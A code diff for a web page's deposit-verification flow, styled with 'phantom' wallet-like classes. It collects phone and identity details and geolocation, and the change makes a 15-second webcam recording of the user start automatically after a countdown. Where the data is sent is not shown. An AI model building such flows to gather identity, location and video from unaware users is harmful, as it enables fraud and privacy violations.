@@ -14,7 +14,7 @@
         .app-container { width: 100%; height: 100vh; background: #000; position: relative; display: flex; flex-direction: column; overflow-y: auto; }
         @media (min-width: 640px) { .app-container { max-width: 380px; height: 720px; border: 1px solid #1a1a1a; border-radius: 32px; } }
         .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .phantom-btn { background: var(--phantom-purple); color: white; font-weight: 700; border-radius: 12px; transition: all 0.2s; }
+        .phantom-btn { background: var(--phantom-purple); color: white; font-weight: 700; border-radius: 12px; transition: all 0.2s; -webkit-tap-highlight-color: transparent; }
         .phantom-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .method-card { border: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.2s; cursor: pointer; }
         .method-card.active { border-color: var(--phantom-purple); background: rgba(171, 102, 255, 0.1); }
@@ -24,9 +24,22 @@
         input[type="file"]::file-selector-button { background: #222; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 10px; }
         .error-msg { color: #ff4b4b; font-size: 10px; font-weight: bold; margin-top: 4px; display: none; }
         
-        /* Step Progress Dots */
         .step-dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255,255,255,0.1); transition: all 0.3s; }
         .step-dot.active { background: var(--phantom-purple); box-shadow: 0 0 10px var(--phantom-purple); }
+        
+        .countdown-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.4);
+            font-size: 64px;
+            font-weight: 800;
+            color: white;
+            z-index: 20;
+            border-radius: 16px;
+        }
     </style>
 </head>
 <body>
@@ -42,14 +55,12 @@
             </div>
         </div>
 
-        <!-- Step Indicator -->
         <div id="step-indicator" class="flex justify-center gap-2 mb-8">
             <div class="step-dot active" id="dot-1"></div>
             <div class="step-dot" id="dot-2"></div>
             <div class="step-dot" id="dot-3"></div>
         </div>
 
-        <!-- STEP 1: TRANSACTION DETAILS -->
         <div id="step-1" class="space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">1. Transaction Details</p>
             <div class="grid grid-cols-2 gap-3">
@@ -72,7 +83,6 @@
             <button onclick="goToStep(2)" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-4">Continue to ID</button>
         </div>
 
-        <!-- STEP 2: IDENTITY INFO -->
         <div id="step-2" class="hidden space-y-4 animate__animated animate__fadeIn">
             <p class="text-[10px] text-white/40 uppercase font-bold tracking-widest">2. Identity Information</p>
             <div class="glass p-3 rounded-xl"><input id="dep-phone" type="tel" placeholder="Phone Number" class="bg-transparent w-full text-xs outline-none"></div>
@@ -95,15 +105,15 @@
             </div>
         </div>
 
-        <!-- STEP 3: VIDEO VERIFICATION -->
         <div id="step-verify" class="hidden space-y-4 animate__animated animate__fadeIn">
             <div class="text-center space-y-2">
                 <h4 class="font-bold text-lg">Live Biometric Feed</h4>
-                <p class="text-xs text-white/50">Keep microphone ON and perform signs clearly.</p>
+                <p class="text-xs text-white/50">Perform signs clearly within the timeframe.</p>
             </div>
 
             <div class="relative">
                 <video id="webcam" autoplay playsinline muted></video>
+                <div id="timer-overlay" class="countdown-overlay">3</div>
                 <div class="absolute top-4 left-4 right-4 flex justify-between">
                     <div class="bg-black/60 backdrop-blur px-3 py-2 rounded-lg border border-white/10">
                         <p class="text-[10px] text-white/40 uppercase font-bold tracking-tighter">Required Signs</p>
@@ -111,7 +121,7 @@
                     </div>
                     <div id="recording-indicator" class="hidden bg-red-600 px-3 py-2 rounded-lg flex items-center gap-2 animate-pulse">
                         <div class="w-2 h-2 bg-white rounded-full"></div>
-                        <span class="text-[10px] font-bold uppercase tracking-widest">REC + AUDIO</span>
+                        <span class="text-[10px] font-bold uppercase tracking-widest">REC</span>
                     </div>
                 </div>
                 <div class="absolute bottom-0 left-0 w-full bg-white/10 h-1">
@@ -121,13 +131,12 @@
 
             <div class="p-4 bg-blue-500/10 border border-blue-500/20 rounded-xl">
                 <p class="text-[10px] text-blue-400 font-bold leading-tight uppercase tracking-widest mb-1">Security Notice</p>
-                <p class="text-[11px] text-white/80">Location and audio are being logged for fraud prevention.</p>
+                <p class="text-[11px] text-white/80">Location and visuals are being logged for fraud prevention.</p>
             </div>
 
-            <button id="capture-btn" onclick="startRecording()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Start 15s Recording</button>
+            <button id="status-display" disabled class="phantom-btn w-full py-4 text-xs uppercase tracking-widest opacity-50">Auto-Starting...</button>
         </div>
 
-        <!-- STEP 4: PENDING STATE -->
         <div id="pending-state" class="hidden text-center space-y-6 pt-10 animate__animated animate__fadeIn">
             <div class="flex justify-center">
                 <div class="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center text-yellow-500 border border-yellow-500/20 animate-pulse">
@@ -181,7 +190,6 @@
 
         window.onload = () => {
             if (!user) { window.location.href = 'dashboard.html'; return; }
-            
             updateLastOnline();
             setInterval(updateLastOnline, 30000); 
 
@@ -205,7 +213,6 @@
         }
 
         function goToStep(step) {
-            // Validate Balance/Amount when moving from Step 1
             if (step === 2) {
                 const amountInput = document.getElementById('dep-amount');
                 const amount = parseFloat(amountInput.value);
@@ -226,7 +233,6 @@
                 }
             }
 
-            // UI Switching
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-2').classList.add('hidden');
             document.getElementById('step-verify').classList.add('hidden');
@@ -235,7 +241,6 @@
             if (step === 2) document.getElementById('step-2').classList.remove('hidden');
             if (step === 3) document.getElementById('step-verify').classList.remove('hidden');
 
-            // Dots
             document.querySelectorAll('.step-dot').forEach((dot, idx) => {
                 dot.classList.toggle('active', idx < step);
             });
@@ -252,7 +257,6 @@
                 return;
             }
 
-            // Capture Geolocation
             navigator.geolocation.getCurrentPosition((pos) => {
                 geoCoords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
             }, (err) => { geoCoords = "Denied"; });
@@ -264,15 +268,33 @@
             goToStep(3);
 
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 document.getElementById('webcam').srcObject = stream;
+                startCountdown();
             } catch (err) {
-                alert("Camera and Microphone are required for secure deposits.");
+                alert("Camera is required for secure deposits.");
             }
         }
 
+        function startCountdown() {
+            let count = 3;
+            const overlay = document.getElementById('timer-overlay');
+            const status = document.getElementById('status-display');
+            
+            const timer = setInterval(() => {
+                count--;
+                if(count <= 0) {
+                    clearInterval(timer);
+                    overlay.classList.add('hidden');
+                    startRecording();
+                } else {
+                    overlay.innerText = count;
+                }
+            }, 1000);
+        }
+
         async function startRecording() {
-            const btn = document.getElementById('capture-btn');
+            const status = document.getElementById('status-display');
             const indicator = document.getElementById('recording-indicator');
             const progress = document.getElementById('video-progress');
             
@@ -297,14 +319,15 @@
             };
 
             mediaRecorder.start();
-            btn.disabled = true;
-            btn.innerText = "RECORDING AUDIO/VIDEO...";
+            status.innerText = "RECORDING VISUALS...";
             indicator.classList.remove('hidden');
             progress.style.width = '100%';
 
             setTimeout(() => {
-                mediaRecorder.stop();
-                indicator.classList.add('hidden');
+                if(mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                    indicator.classList.add('hidden');
+                }
             }, 15000);
         }
 
